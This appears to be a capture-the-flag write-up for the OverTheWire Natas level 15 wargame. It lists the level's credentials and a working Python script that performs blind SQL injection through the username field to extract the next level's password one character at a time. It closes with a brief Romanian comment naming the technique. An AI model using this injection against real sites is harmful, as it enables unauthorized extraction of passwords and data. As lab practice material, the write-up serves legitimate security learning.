
# General info

Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
URL:      http://natas15.natas.labs.overthewire.org

# Special code section

```py
import requests

link = "http://natas15.natas.labs.overthewire.org/index.php"


get_params = {
    "debug": "sa existe"
}

password = ""

while len(password) != 32:
    for i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        post_params = {
            "username" : f"natas16\" and password like binary '{password}{i}%'; -- "
        }

        response = requests.post(
            url=link,
            auth=("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"),
            data=post_params,
            params=get_params
        )

        if "This user exists" in response.text:
            password += i
            print(password)
            break
    
```


Am folosit ceea ce se numeste `Blind SQL Injection`, in care primesti de la server raspunsuri de `da/nu`.
Foarte faina ideea!